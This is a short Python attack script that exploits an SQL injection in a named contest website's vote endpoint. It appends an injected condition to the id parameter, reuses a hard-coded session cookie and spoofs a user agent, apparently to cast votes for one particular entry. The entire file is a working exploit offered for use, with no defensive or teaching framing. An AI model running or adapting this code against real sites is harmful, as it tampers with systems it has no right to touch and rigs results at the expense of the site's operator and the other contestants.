##################################
# Boro Sitnikovski 24.11.2011
# SQL Injection in PHP $_GET['id']
#

import urllib, urllib.request as urllib2, urllib.error, http.cookiejar as cookielib, time
from urllib.parse import urlencode

zaki_id = '3828'

def InitializeOpener(session_id):
	#cookie storage
	cj = cookielib.CookieJar()
	#create an opener
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	#add useragent, sites don't like to interact programs.
	opener.addheaders.append(('User-agent', 'Mozilla/4.0'))
	#add cookies (this is important)
	opener.addheaders.append(('Cookie', 'PHPSESSID=' + session_id))
	return opener

def GetStatus(opener, user_id):
	#initialize resp
	resp = opener.open('http://www.eazycontest.com/instant/303/getImageDetail.php?id=' + user_id + '&filter=0')
	#initialize data
	data = resp.read()
	#close resp
	resp.close()
	#return resp
	return str(data)

def DoVote(opener, user_id):
	#initialize SQL injection string
	hack = '%20and%20fb_uid=1'
	#initialize resp
	resp = opener.open('http://www.eazycontest.com/instant/303/doVote.php?id=' + user_id + hack)
	#initialize data
	data = resp.read()
	#close resp
	resp.close()
	#return resp
	return data

def ParseResult(data):
	#convert bytes to str
	data = str(data)
	#remove everything before votes and everything after the actual votes number
	data = data[data.find('"votes":"')+9:data.find('"}')]
	#return parsed data
	return data

#session = input('session: ').replace("\r", "").replace("\n", "")
session = 'm6svpudqn474f7q6t8aj7or3m3'
opener = InitializeOpener(session)

for i in range(0, 1):
	data = ParseResult(DoVote(opener, zaki_id))
	print('ding => ' + data)